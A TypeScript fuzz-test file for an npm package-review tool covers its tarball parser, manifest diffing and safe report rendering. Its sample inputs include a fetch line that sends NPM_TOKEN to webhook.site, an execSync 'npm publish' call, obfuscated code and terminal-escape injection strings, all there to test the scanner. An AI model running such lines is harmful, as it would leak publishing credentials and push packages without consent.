// Property-based tests (fuzzing) with fast-check. Package tarballs and their
// package.json are untrusted input, so the parser, the rules and the reports
// must cope with anything: never crash with a non-Error, never hang, never
// return unsafe paths, never print raw control characters.
import fc from 'fast-check';
import { gzipSync } from 'node:zlib';
import { describe, expect, it } from 'vitest';
import { addedLines, diffManifests, type Manifest } from '../src/diff.js';
import { compareVersions } from '../src/npm.js';
import { displaySafe, renderMarkdown, renderText } from '../src/report.js';
import { ignoreMatcher, reviewFiles } from '../src/review.js';
import { readTarball, type TarFile } from '../src/tar.js';
import { makeTarball } from './helpers.js';

const RUNS = { numRuns: 200 };

/** Paths in a parsed tarball must never escape the package folder. */
function assertSafePaths(files: Map<string, TarFile>): void {
  for (const [path, file] of files) {
    expect(path).toBe(file.path);
    expect(path).not.toMatch(/^\/|\\|(?:^|\/)\.\.?(?:\/|$)|\/\/|\/$/);
    expect(path.length).toBeGreaterThan(0);
  }
}

/** Runs `fn`; returns normally or throws an Error instance, nothing else. */
function parsesOrRejects(input: Uint8Array): void {
  try {
    assertSafePaths(readTarball(input, { maxBytes: 1 << 20 }));
  } catch (error) {
    expect(error).toBeInstanceOf(Error);
  }
}

const segment = fc.oneof(
  fc.stringMatching(/^[A-Za-z0-9_-][A-Za-z0-9._-]{0,24}$/),
  fc.string({ unit: fc.constantFrom('a', 'é', '日', '😀', '-', '_', ' '), minLength: 1, maxLength: 12 }).filter((s) => s.trim() === s && s !== ''),
);
const path = fc.array(segment, { minLength: 1, maxLength: 8 }).map((parts) => parts.join('/'));
const fileSet = fc.uniqueArray(fc.tuple(path, fc.uint8Array({ maxLength: 2000 })), { selector: ([p]) => p, maxLength: 8 });

/** Overwrites bytes at random positions and maybe truncates. */
const mutation = fc.record({
  writes: fc.array(fc.tuple(fc.nat(), fc.integer({ min: 0, max: 255 })), { maxLength: 24 }),
  cut: fc.option(fc.nat(), { nil: undefined }),
});
function mutate(data: Buffer, m: { writes: [number, number][]; cut: number | undefined }): Buffer {
  const out = Buffer.from(data);
  for (const [at, value] of m.writes) out[at % out.length] = value;
  return m.cut === undefined ? out : out.subarray(0, m.cut % (out.length + 1));
}

describe('fuzz: tar reader', () => {
  it('round-trips any set of files and paths', () => {
    fc.assert(
      fc.property(fileSet, fc.boolean(), (entries, gnu) => {
        const files = readTarball(makeTarball(Object.fromEntries(entries.map(([p, d]) => [p, Buffer.from(d)])), { gnu }));
        expect([...files.keys()].sort()).toEqual(entries.map(([p]) => p).sort());
        for (const [p, d] of entries) expect(files.get(p)?.data.equals(Buffer.from(d))).toBe(true);
      }),
      RUNS,
    );
  });

  it('survives random bytes, raw or gzipped', () => {
    fc.assert(
      fc.property(fc.uint8Array({ maxLength: 4096 }), fc.boolean(), (bytes, gzip) => {
        parsesOrRejects(gzip ? gzipSync(bytes) : bytes);
      }),
      RUNS,
    );
  });

  it('survives corrupted and truncated archives', () => {
    fc.assert(
      fc.property(fileSet, mutation, fc.boolean(), (entries, m, gzip) => {
        const tar = makeTarball(Object.fromEntries(entries.map(([p, d]) => [p, Buffer.from(d)])), { gzip: false });
        const broken = mutate(tar, m);
        parsesOrRejects(gzip ? gzipSync(broken) : broken);
      }),
      RUNS,
    );
  });

  it('survives any value in the size field, including negative ones', () => {
    const sizeField = fc.oneof(
      fc.integer({ min: -1_000_000, max: 1_000_000 }).map((n) => n.toString(8)),
      fc.string({ unit: fc.constantFrom('-', '+', ' ', '0', '1', '7', '8', 'x', '\0'), maxLength: 12 }),
    );
    fc.assert(
      fc.property(sizeField, (size) => {
        const tar = makeTarball({ 'a.txt': 'x'.repeat(600), 'b.txt': 'y' }, { gzip: false });
        const header = 512; // the first entry after the package/ folder
        tar.fill(0, header + 124, header + 136);
        tar.write(size, header + 124, 'latin1');
        parsesOrRejects(tar);
      }),
      RUNS,
    );
  });
});

const awkwardKey = fc.oneof(fc.string({ maxLength: 12 }), fc.constantFrom('__proto__', 'constructor', 'toString', 'hasOwnProperty', 'postinstall', 'install', 'kleur'));
const manifestField = fc.oneof(
  fc.jsonValue({ maxDepth: 2 }),
  fc.dictionary(awkwardKey, fc.oneof(fc.string({ maxLength: 40 }), fc.jsonValue({ maxDepth: 1 })), { maxKeys: 6 }),
);
const manifest = fc.record(
  {
    name: fc.oneof(fc.constant('demo'), fc.jsonValue({ maxDepth: 1 })),
    version: fc.oneof(fc.constantFrom('1.0.0', '1.0.1', '0.0.0-stage', 'v2', ''), fc.jsonValue({ maxDepth: 1 })),
    scripts: manifestField,
    dependencies: manifestField,
    optionalDependencies: manifestField,
    peerDependencies: manifestField,
    bin: manifestField,
    main: manifestField,
    exports: manifestField,
  },
  { requiredKeys: [] },
);
const code = fc.oneof(
  fc.string({ maxLength: 400 }),
  fc.constantFrom(
    "require('child_process').execSync('npm publish')",
    "fetch('https://webhook.site/x', { body: process.env.NPM_TOKEN })",
    `var _0x1a2b=${'"\\x41"'.repeat(50)};`,
    '\u001b[2K\u001b[1A‮\r| injected |',
  ),
);
const pkgFiles = fc.record({
  manifest: fc.oneof(manifest.map((m) => JSON.stringify(m)), fc.string({ maxLength: 60 })),
  files: fc.dictionary(fc.constantFrom('index.js', 'lib/a.js', 'bin/cli', 'install.js', 'x.d.ts', 'data.bin', 'README.md'), code, { maxKeys: 4 }),
});
function toFiles(p: { manifest: string; files: Record<string, string> }): Map<string, TarFile> {
  return readTarball(makeTarball({ 'package.json': p.manifest, ...p.files }));
}

describe('fuzz: review', () => {
  it('reviews any pair of packages without throwing, with well-formed findings and safe reports', () => {
    fc.assert(
      fc.property(fc.option(pkgFiles, { nil: null }), pkgFiles, fc.option(fc.string({ maxLength: 20 }), { nil: undefined }), (before, after, stagedBy) => {
        const review = reviewFiles(before ? toFiles(before) : null, toFiles(after), stagedBy === undefined ? {} : { stagedBy, previousPublisher: 'alice' });
        for (const f of review.findings) {
          expect(['high', 'medium', 'low']).toContain(f.severity);
          expect(f.rule).toMatch(/^[a-z][a-z0-9-]*$/);
        }
        expect(review.counts.high + review.counts.medium + review.counts.low).toBe(review.findings.length);
        // No raw control characters may reach the terminal or the Markdown summary.
        expect(renderText(review, { verbose: true })).not.toMatch(/[\u0000-\u0009\u000b-\u001f\u007f-\u009f‪-‮⁦-⁩]/);
        expect(renderMarkdown(review)).not.toMatch(/[\u0000-\u0009\u000b-\u001f\u007f-\u009f‪-‮⁦-⁩]/);
      }),
      RUNS,
    );
  });

  it('diffs manifests without inheriting keys from Object.prototype', () => {
    fc.assert(
      fc.property(fc.dictionary(awkwardKey, fc.string({ maxLength: 10 }), { maxKeys: 5 }), (deps) => {
        const diff = diffManifests({ name: 'demo', version: '1.0.0' }, { name: 'demo', version: '1.0.1', dependencies: deps } as Manifest);
        expect(Object.keys(diff.dependencies.dependencies.added).sort()).toEqual(Object.keys(deps).sort());
        expect(Object.keys(diff.dependencies.dependencies.changed)).toEqual([]);
      }),
      RUNS,
    );
  });
});

describe('fuzz: helpers', () => {
  it('addedLines returns exactly the lines a change introduces', () => {
    const lines = fc.array(fc.constantFrom('a', 'b', 'c', '', 'd e'), { maxLength: 12 });
    fc.assert(
      fc.property(lines.filter((l) => l.length > 0), lines, (before, extra) => {
        const text = before.join('\n');
        expect(addedLines(text, text)).toEqual([]);
        expect(addedLines(text, [...before, ...extra].join('\n')).sort()).toEqual([...extra].sort());
      }),
      RUNS,
    );
  });

  it('displaySafe removes every unsafe character and keeps everything else', () => {
    fc.assert(
      fc.property(fc.string({ unit: 'binary', maxLength: 80 }), (s) => {
        const out = displaySafe(s);
        expect(out).not.toMatch(/[\u0000-\u001f\u007f-\u009f؜‎‏‪-‮⁦-⁩]/);
        if (!/[\u0000-\u001f\u007f-\u009f؜‎‏‪-‮⁦-⁩]/.test(s)) expect(out).toBe(s);
      }),
      RUNS,
    );
  });

  it('compareVersions is a consistent ordering', () => {
    const semver = fc
      .tuple(fc.nat(20), fc.nat(20), fc.nat(20), fc.option(fc.constantFrom('alpha', 'beta.1', 'rc.2', 'stage'), { nil: undefined }))
      .map(([a, b, c, pre]) => `${a}.${b}.${c}${pre ? `-${pre}` : ''}`);
    fc.assert(
      fc.property(semver, semver, (a, b) => {
        expect(compareVersions(a, a)).toBe(0);
        expect(Math.sign(compareVersions(a, b))).toBe(-Math.sign(compareVersions(b, a)));
      }),
      RUNS,
    );
  });

  it('ignore globs: ** matches every path, a bare rule matches every file', () => {
    fc.assert(
      fc.property(path, (p) => {
        expect(ignoreMatcher(['child-process:**'])({ rule: 'child-process', severity: 'medium', message: '', file: p })).toBe(true);
        expect(ignoreMatcher(['child-process'])({ rule: 'child-process', severity: 'medium', message: '', file: p })).toBe(true);
        expect(ignoreMatcher(['dynamic-code:**'])({ rule: 'child-process', severity: 'medium', message: '', file: p })).toBe(false);
      }),
      RUNS,
    );
  });
});
